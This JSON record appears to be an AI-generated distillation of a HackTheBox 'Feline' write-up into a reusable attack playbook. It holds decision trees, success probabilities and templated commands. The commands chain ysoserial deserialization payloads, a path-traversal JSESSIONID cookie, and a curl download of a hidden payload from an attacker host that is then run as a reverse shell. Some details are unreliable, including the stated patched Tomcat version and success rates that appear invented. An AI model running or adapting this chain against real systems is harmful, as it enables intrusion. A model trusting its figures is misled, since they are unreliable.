{
  "writeup_id": "Htb_Feline",
  "scenario_fingerprint": {
    "scenario_name": "linux_tomcat_deserialization_container_escape",
    "primary_services": [
      "http",
      "ssh",
      "docker",
      "saltstack"
    ],
    "port_signature": "22+8080",
    "service_combination": "ssh+tomcat+docker_socket",
    "os_family": "linux",
    "environment_type": "containerized_application",
    "entry_vector": "tomcat_deserialization_upload",
    "privilege_path": "tomcat_to_container_to_host_root",
    "attack_complexity": "hard",
    "estimated_time": "3-4 hours",
    "scenario_confidence": 0.92,
    "distinguishing_factors": [
      "tomcat_9.0.27_vulnerable",
      "file_upload_functionality",
      "session_persistence_enabled",
      "docker_socket_accessible_from_container"
    ],
    "environmental_clues": [
      "ubuntu_20.04_host",
      "tomcat_on_port_8080",
      "file_upload_with_path_traversal_filtering",
      "saltstack_in_container",
      "docker_socket_mounted_in_container"
    ],
    "similar_scenarios": [
      "jerry_htb_easy",
      "tabby_htb_easy"
    ],
    "unique_aspects": [
      "cve_2020_9484_deserialization",
      "saltstack_cve_exploitation",
      "docker_socket_privilege_escalation",
      "multi_stage_container_escape"
    ]
  },
  "success_patterns": {
    "success_factors": [
      {
        "technique": "CVE-2020-9484_Deserialization",
        "success_reason": "Tomcat 9.0.27 vulnerable to session deserialization with file upload capability",
        "prerequisite_indicators": [
          "tomcat_version_vulnerable",
          "file_upload_functionality",
          "session_management_enabled",
          "writable_upload_directory"
        ],
        "recognition_patterns": [
          "tomcat version 9.0.27 or earlier",
          "JSESSIONID cookie present",
          "file upload returns path disclosure",
          "error messages reveal /opt/samples/uploads path"
        ],
        "failure_modes": [
          "tomcat_patched_to_9.0.29+",
          "no_file_upload_capability",
          "upload_path_restrictions",
          "deserialization_disabled"
        ],
        "environmental_factors": [
          "default_tomcat_session_handling",
          "predictable_upload_directory",
          "insufficient_input_validation",
          "java_commons_collections_available"
        ],
        "success_probability": 0.92,
        "typical_timeframe": "15-30 minutes"
      },
      {
        "technique": "File_Upload_Path_Traversal",
        "success_reason": "Upload functionality reveals absolute path in error messages",
        "prerequisite_indicators": [
          "file_upload_form_available",
          "error_messages_verbose",
          "path_disclosure_in_responses"
        ],
        "recognition_patterns": [
          "empty filename triggers path disclosure",
          "/opt/samples/uploads path revealed",
          "directory traversal attempts blocked with 'Invalid filename'"
        ],
        "failure_modes": [
          "generic_error_messages",
          "no_path_disclosure",
          "upload_functionality_disabled"
        ],
        "environmental_factors": [
          "debug_mode_enabled",
          "verbose_error_reporting",
          "insufficient_error_handling"
        ],
        "success_probability": 0.85,
        "typical_timeframe": "5-10 minutes"
      }
    ],
    "critical_discoveries": [
      {
        "discovery": "Tomcat version 9.0.27",
        "discovery_method": "nmap service detection and error page disclosure",
        "why_critical": "Vulnerable to CVE-2020-9484 deserialization attack",
        "how_to_recognize": [
          "nmap -sV shows Apache Tomcat 9.0.27",
          "error pages display version in footer",
          "version predates security patches"
        ],
        "follow_up_actions": [
          "check_cve_2020_9484_applicability",
          "test_file_upload_functionality",
          "generate_ysoserial_payload"
        ]
      },
      {
        "discovery": "Upload path disclosure",
        "discovery_method": "Empty filename submission",
        "why_critical": "Reveals absolute path needed for session traversal attack",
        "how_to_recognize": [
          "error message shows /opt/samples/uploads",
          "path construction logic exposed",
          "directory traversal filtering present"
        ],
        "follow_up_actions": [
          "calculate_traversal_path",
          "upload_serialized_payload",
          "craft_jsessionid_cookie"
        ]
      }
    ],
    "escalation_keys": [
      {
        "privilege_level": "unauthenticated_web",
        "escalation_method": "deserialization_to_rce",
        "why_possible": "Combination of file upload and vulnerable session handling",
        "recognition_signs": [
          "ysoserial_payload_upload_successful",
          "jsessionid_cookie_accepted",
          "commons_collections_available"
        ],
        "exploitation_path": "Upload .session file → Set JSESSIONID cookie → Trigger deserialization → RCE"
      }
    ]
  },
  "decision_tree": {
    "decision_points": [
      {
        "step": 1,
        "situation": "Found only ports 22 (SSH) and 8080 (HTTP) open on Linux host",
        "decision": "Focus on web application enumeration since SSH unlikely without credentials",
        "reasoning": "Limited attack surface with only two ports, web app more likely entry point",
        "confidence": 0.9,
        "alternatives": [
          {
            "option": "ssh_bruteforce",
            "when": "if web enumeration fails"
          },
          {
            "option": "version_specific_ssh_exploits",
            "when": "if OpenSSH 8.2p1 has known CVEs"
          }
        ],
        "success_indicators": [
          "web_application_identified",
          "upload_functionality_found",
          "technology_stack_identified"
        ],
        "next_decision": "analyze_web_application_technology"
      },
      {
        "step": 2,
        "situation": "Identified Apache Tomcat 9.0.27 with file upload functionality",
        "decision": "Research Tomcat version-specific CVEs before attempting generic web attacks",
        "reasoning": "Specific version suggests intentional vulnerability, CVE research more efficient than blind testing",
        "confidence": 0.95,
        "prerequisites": [
          "tomcat_version_confirmed",
          "upload_functionality_tested"
        ],
        "success_indicators": [
          "relevant_cves_found",
          "exploit_conditions_met"
        ],
        "failure_fallbacks": [
          "directory_traversal_testing",
          "file_upload_bypass",
          "session_manipulation"
        ]
      },
      {
        "step": 3,
        "situation": "Found CVE-2020-9484 affects Tomcat 9.0.27 and upload functionality exists",
        "decision": "Attempt deserialization attack via session manipulation",
        "reasoning": "CVE combines file upload with session deserialization, matches available functionality",
        "confidence": 0.85,
        "prerequisites": [
          "file_upload_working",
          "session_cookies_present",
          "java_serialization_possible"
        ],
        "success_indicators": [
          "ysoserial_payload_executed",
          "rce_confirmed"
        ],
        "failure_fallbacks": [
          "try_different_ysoserial_gadgets",
          "alternative_upload_paths",
          "session_fixation"
        ]
      }
    ],
    "branching_logic": {
      "if_tomcat_identified": {
        "action": "check_cve_database_for_version",
        "tools": [
          "cve_databases",
          "exploit-db",
          "tomcat_security_advisories"
        ],
        "next_phase": "exploit_version_specific_vulnerability"
      },
      "if_upload_functionality_found": {
        "action": "test_upload_restrictions_and_file_paths",
        "purpose": "understand_file_storage_location_and_filtering",
        "tools": [
          "burp_suite",
          "custom_payloads"
        ]
      },
      "if_deserialization_conditions_met": {
        "action": "generate_ysoserial_payload_and_test_gadget_chains",
        "tools": [
          "ysoserial",
          "commoncollections_payloads"
        ],
        "testing_order": [
          "CommonsCollections1",
          "CommonsCollections2",
          "CommonsCollections3"
        ]
      },
      "if_rce_achieved": {
        "action": "establish_stable_shell_and_enumerate_environment",
        "tools": [
          "reverse_shells",
          "system_enumeration_scripts"
        ],
        "next_phase": "privilege_escalation_enumeration"
      }
    },
    "optimization_rules": [
      {
        "rule": "always_research_specific_versions_before_generic_attacks",
        "reasoning": "ctf_boxes_often_use_specific_vulnerable_versions_intentionally",
        "applicability": "identified_software_with_specific_versions"
      },
      {
        "rule": "test_multiple_ysoserial_gadget_chains_systematically",
        "reasoning": "different_java_environments_support_different_gadget_chains",
        "applicability": "java_deserialization_attacks"
      },
      {
        "rule": "combine_file_upload_with_path_traversal_for_deserialization",
        "reasoning": "powerful_attack_vector_when_session_handling_vulnerable",
        "applicability": "tomcat_applications_with_file_upload"
      },
      {
        "rule": "use_simple_commands_like_ping_to_test_rce_before_complex_payloads",
        "reasoning": "easier_to_confirm_execution_and_debug_payload_issues",
        "applicability": "testing_deserialization_rce"
      }
    ]
  },
  "applicability_rules": {
    "technique_rules": [
      {
        "technique": "Tomcat CVE-2020-9484 Session Persistence RCE",
        "mitre_id": "T1190",
        "required_services": [
          "http",
          "tomcat"
        ],
        "required_ports": [
          8080,
          80,
          443
        ],
        "os_requirements": [
          "linux",
          "windows"
        ],
        "environmental_prerequisites": [
          "tomcat_version_vulnerable",
          "file_upload_functionality",
          "session_persistence_enabled",
          "predictable_upload_path"
        ],
        "success_indicators": [
          "tomcat_version_9.0.27_or_earlier",
          "upload_endpoint_accessible",
          "jsessionid_cookie_present",
          "serialized_payload_uploadable"
        ],
        "incompatible_with": [
          "tomcat_version_9.0.29_or_later",
          "no_file_upload",
          "session_persistence_disabled",
          "strict_file_filtering"
        ],
        "confidence_boosters": [
          "error_messages_reveal_paths",
          "filename_parameter_injectable",
          "java_stack_traces_visible",
          "upload_directory_predictable"
        ],
        "typical_success_rate": 0.75,
        "estimated_time": "15-30 minutes"
      },
      {
        "technique": "Tomcat AJP Request Injection",
        "mitre_id": "T1190",
        "required_services": [
          "ajp",
          "tomcat"
        ],
        "required_ports": [
          8009
        ],
        "os_requirements": [
          "linux",
          "windows"
        ],
        "environmental_prerequisites": [
          "ajp_connector_enabled",
          "tomcat_version_vulnerable",
          "ajp_port_accessible"
        ],
        "success_indicators": [
          "port_8009_open",
          "ajp_protocol_responsive",
          "tomcat_version_pre_9.0.31"
        ],
        "incompatible_with": [
          "ajp_disabled",
          "tomcat_version_9.0.31_or_later",
          "ajp_port_filtered"
        ],
        "confidence_boosters": [
          "default_ajp_configuration",
          "apache_tomcat_integration",
          "legacy_deployment"
        ],
        "typical_success_rate": 0.85,
        "estimated_time": "10-20 minutes"
      },
      {
        "technique": "Docker Socket Privilege Escalation",
        "mitre_id": "T1611",
        "required_services": [
          "docker"
        ],
        "required_ports": [],
        "os_requirements": [
          "linux"
        ],
        "environmental_prerequisites": [
          "docker_socket_accessible",
          "container_environment",
          "docker_socket_mounted"
        ],
        "success_indicators": [
          "docker_sock_file_exists",
          "docker_commands_executable",
          "container_breakout_possible"
        ],
        "incompatible_with": [
          "docker_socket_not_mounted",
          "non_container_environment",
          "docker_daemon_unavailable"
        ],
        "confidence_boosters": [
          "proc_1_cgroup_container_indicators",
          "dockerenv_file_present",
          "limited_filesystem_access"
        ],
        "typical_success_rate": 0.9,
        "estimated_time": "5-10 minutes"
      },
      {
        "technique": "Salt Stack CVE Exploitation",
        "mitre_id": "T1190",
        "required_services": [
          "salt-master",
          "salt-minion"
        ],
        "required_ports": [
          4505,
          4506
        ],
        "os_requirements": [
          "linux"
        ],
        "environmental_prerequisites": [
          "salt_stack_running",
          "vulnerable_salt_version",
          "salt_ports_accessible"
        ],
        "success_indicators": [
          "salt_master_port_4505_open",
          "salt_publisher_port_4506_open",
          "salt_authentication_bypassable"
        ],
        "incompatible_with": [
          "salt_stack_patched",
          "salt_ports_filtered",
          "salt_authentication_hardened"
        ],
        "confidence_boosters": [
          "default_salt_configuration",
          "container_salt_deployment",
          "automation_platform_indicators"
        ],
        "typical_success_rate": 0.8,
        "estimated_time": "15-25 minutes"
      }
    ],
    "environmental_detectors": {
      "tomcat_server": {
        "port_indicators": [
          8080,
          8443,
          8009
        ],
        "service_indicators": [
          "http",
          "ajp"
        ],
        "banner_indicators": [
          "Apache Tomcat",
          "Tomcat/9.0"
        ],
        "confidence_threshold": 0.9
      },
      "container_environment": {
        "port_indicators": [],
        "service_indicators": [
          "docker"
        ],
        "file_indicators": [
          "/.dockerenv",
          "/proc/1/cgroup"
        ],
        "confidence_threshold": 0.85
      },
      "salt_stack": {
        "port_indicators": [
          4505,
          4506
        ],
        "service_indicators": [
          "salt-master",
          "salt-minion"
        ],
        "banner_indicators": [
          "Salt",
          "SaltStack"
        ],
        "confidence_threshold": 0.8
      },
      "file_upload_capability": {
        "port_indicators": [
          80,
          443,
          8080
        ],
        "service_indicators": [
          "http",
          "https"
        ],
        "endpoint_indicators": [
          "/upload",
          "/service",
          "multipart/form-data"
        ],
        "confidence_threshold": 0.75
      }
    },
    "attack_prioritization": {
      "high_priority": [
        {
          "attack": "tomcat_session_persistence_rce",
          "when": "tomcat_detected_and_file_upload_present",
          "reason": "direct_rce_with_file_upload_capability"
        },
        {
          "attack": "docker_socket_privilege_escalation",
          "when": "container_environment_detected",
          "reason": "reliable_container_breakout_method"
        }
      ],
      "medium_priority": [
        {
          "attack": "ajp_request_injection",
          "when": "ajp_port_8009_detected",
          "reason": "high_success_rate_but_requires_ajp_access"
        },
        {
          "attack": "salt_stack_cve_exploitation",
          "when": "salt_ports_detected",
          "reason": "automation_platforms_often_misconfigured"
        }
      ]
    }
  },
  "technique_intelligence": {
    "techniques": [
      {
        "name": "Tomcat Session Deserialization",
        "mitre_id": "T1190",
        "category": "initial_access",
        "phase": "initial_access",
        "tools_used": [
          {
            "name": "ysoserial",
            "command_template": "java -jar ysoserial.jar {payload_type} '{command}' > {output_file}",
            "actual_command": "java -jar /opt/ysoserial/ysoserial-master.jar CommonsCollections2 'ping -c 1 10.10.14.15' > ping.session",
            "output_pattern": "serialized_java_object",
            "effectiveness_rating": 5,
            "reliability": 0.9
          },
          {
            "name": "curl",
            "command_template": "curl -s http://{target}:8080/ -H 'Cookie: JSESSIONID=../../../../../opt/samples/uploads/{filename}'",
            "actual_command": "curl -s http://10.10.10.205:8080/ -H 'Cookie: JSESSIONID=../../../../../opt/samples/uploads/ping'",
            "success_factors": [
              "vulnerable_tomcat_version",
              "file_upload_capability",
              "session_persistence_enabled"
            ],
            "effectiveness_rating": 5
          }
        ],
        "prerequisites": [
          "tomcat_version_9.0.27_or_earlier",
          "file_upload_functionality",
          "session_persistence_enabled",
          "java_commons_collections_in_classpath"
        ],
        "success_indicators": [
          "http_500_error_on_deserialization",
          "command_execution_confirmed",
          "reverse_shell_connection"
        ],
        "common_failures": [
          "wrong_commons_collections_payload",
          "path_traversal_blocked",
          "command_contains_special_characters"
        ],
        "follow_up_techniques": [
          "privilege_escalation",
          "container_escape",
          "docker_socket_exploitation"
        ],
        "time_investment": "30-60 minutes",
        "skill_level": "intermediate"
      },
      {
        "name": "Multi-Stage Payload Delivery",
        "mitre_id": "T1105",
        "category": "command_and_control",
        "phase": "execution",
        "tools_used": [
          {
            "name": "curl",
            "command_template": "curl {attacker_ip}/{payload_file} -o /tmp/.{hidden_name}",
            "actual_command": "curl 10.10.14.15/payload.sh -o /tmp/.0xdf",
            "output_pattern": "file_downloaded_successfully",
            "effectiveness_rating": 4,
            "reliability": 0.95
          },
          {
            "name": "chmod",
            "command_template": "chmod +x /tmp/.{filename}",
            "actual_command": "chmod +x /tmp/.0xdf",
            "success_factors": [
              "write_permissions_to_tmp",
              "file_successfully_downloaded"
            ],
            "effectiveness_rating": 5
          }
        ],
        "prerequisites": [
          "initial_command_execution",
          "outbound_http_connectivity",
          "write_access_to_tmp_directory"
        ],
        "success_indicators": [
          "payload_downloaded_successfully",
          "file_permissions_modified",
          "reverse_shell_established"
        ],
        "common_failures": [
          "outbound_connectivity_blocked",
          "payload_detected_by_av",
          "insufficient_file_permissions"
        ],
        "follow_up_techniques": [
          "persistence_establishment",
          "lateral_movement",
          "privilege_escalation"
        ],
        "time_investment": "10-20 minutes",
        "skill_level": "beginner"
      }
    ],
    "tool_effectiveness": [
      {
        "tool": "ysoserial",
        "use_case": "java_deserialization_exploitation",
        "effectiveness_rating": 5,
        "reliability": 0.85,
        "learning_curve": "medium",
        "essential_for": [
          "java_application_testing"
        ],
        "alternatives": [
          "custom_serialized_payloads",
          "marshalsec"
        ],
        "best_practices": [
          "test_multiple_commons_collections_payloads",
          "avoid_special_characters_in_commands",
          "use_multi_stage_approach_for_complex_payloads"
        ]
      },
      {
        "tool": "nmap",
        "use_case": "service_enumeration",
        "effectiveness_rating": 4,
        "reliability": 0.98,
        "learning_curve": "low",
        "essential_for": [
          "initial_reconnaissance"
        ],
        "alternatives": [
          "masscan",
          "rustscan"
        ],
        "best_practices": [
          "use_min_rate_for_faster_scanning",
          "follow_up_with_service_detection",
          "identify_os_from_service_versions"
        ]
      }
    ],
    "command_sequences": [
      {
        "sequence_name": "cve_2020_9484_exploitation",
        "steps": [
          {
            "step": 1,
            "command": "java -jar ysoserial.jar CommonsCollections2 'curl 10.10.14.15/payload.sh -o /tmp/.0xdf' > payload.session",
            "purpose": "Create serialized payload for file download",
            "expected_output": "Binary serialized object file"
          },
          {
            "step": 2,
            "command": "curl -s 'http://10.10.10.205:8080/upload.jsp?email=abcd' -F 'image=@./payload.session'",
            "purpose": "Upload malicious serialized payload",
            "expected_output": "File uploaded successfully message"
          },
          {
            "step": 3,
            "command": "curl -s http://10.10.10.205:8080/service/ -H 'Cookie: JSESSIONID=../../../../../../opt/samples/uploads/payload'",
            "purpose": "Trigger deserialization via session cookie",
            "expected_output": "HTTP 500 error with command execution"
          },
          {
            "step": 4,
            "command": "java -jar ysoserial.jar CommonsCollections2 'chmod +x /tmp/.0xdf' > payload.session",
            "purpose": "Make downloaded payload executable",
            "expected_output": "Serialized chmod command"
          },
          {
            "step": 5,
            "command": "java -jar ysoserial.jar CommonsCollections2 '/tmp/.0xdf' > payload.session",
            "purpose": "Execute reverse shell payload",
            "expected_output": "Reverse shell connection established"
          }
        ],
        "success_rate": 0.9,
        "typical_duration": "15-30 minutes"
      },
      {
        "sequence_name": "tomcat_reconnaissance",
        "steps": [
          {
            "step": 1,
            "command": "nmap -p- --min-rate 10000 10.10.10.205",
            "purpose": "Discover open ports",
            "expected_output": "Ports 22 and 8080 open"
          },
          {
            "step": 2,
            "command": "nmap -p 22,8080 -sC -sV 10.10.10.205",
            "purpose": "Service version detection",
            "expected_output": "Apache Tomcat 9.0.27 identified"
          },
          {
            "step": 3,
            "command": "gobuster dir -u http://10.10.10.205:8080 -w /usr/share/wordlists/dirb/common.txt",
            "purpose": "Directory enumeration",
            "expected_output": "Upload functionality discovered"
          }
        ],
        "success_rate": 0.95,
        "typical_duration": "10-15 minutes"
      }
    ]
  },
  "metadata": {
    "basic_metadata": {
      "name": "Feline",
      "difficulty": "Hard",
      "os": "Linux Ubuntu 20.04",
      "platform": "HackTheBox",
      "release_date": "2020-08-29",
      "author": "MinatoTW, MrR3boot",
      "estimated_time": "4-6 hours"
    },
    "intelligence_metadata": {
      "attack_complexity": "high",
      "skill_level_required": "advanced",
      "primary_attack_vectors": [
        "tomcat_deserialization",
        "container_escape",
        "docker_socket"
      ],
      "key_vulnerabilities": [
        "cve_serialization",
        "saltstack_cve",
        "docker_socket_exposure"
      ],
      "environment_type": "containerized_application_server",
      "real_world_relevance": "very_high",
      "learning_value": [
        "java_deserialization",
        "container_security",
        "docker_exploitation",
        "saltstack_attacks"
      ],
      "prerequisite_knowledge": [
        "java_serialization",
        "tomcat_architecture",
        "docker_fundamentals",
        "linux_containers"
      ]
    },
    "categorization": {
      "primary_category": "web_application",
      "subcategories": [
        "deserialization",
        "container_escape",
        "privilege_escalation"
      ],
      "attack_types": [
        "remote_code_execution",
        "container_breakout",
        "privilege_escalation"
      ],
      "defensive_lessons": [
        "secure_deserialization",
        "container_hardening",
        "docker_socket_security",
        "saltstack_patching"
      ]
    },
    "similarity_markers": {
      "similar_boxes": [
        "Tabby",
        "Arkham",
        "Kotarak"
      ],
      "similarity_reasons": [
        "tomcat_exploitation",
        "java_deserialization",
        "container_technologies"
      ],
      "unique_aspects": [
        "saltstack_exploitation",
        "docker_socket_abuse",
        "multi_stage_container_attack"
      ],
      "difficulty_factors": [
        "complex_attack_chain",
        "multiple_cves",
        "container_knowledge_required",
        "advanced_exploitation_techniques"
      ]
    }
  },
  "extraction_metadata": {
    "parse_date": "2025-07-04T21:25:22.951174",
    "original_file": "0xdf_writeups/Htb Feline.md",
    "content_length": 41818,
    "extraction_version": "2.0-claude",
    "model_used": "claude-sonnet-4-20250514"
  },
  "intelligence_confidence": 0.9166666666666667,
  "quality_breakdown": {
    "scenario_uniqueness": 1.0,
    "success_logic_clarity": 0.6666666666666666,
    "applicability_completeness": 1.0,
    "decision_tree_depth": 1.0,
    "technique_actionability": 1.0
  }
}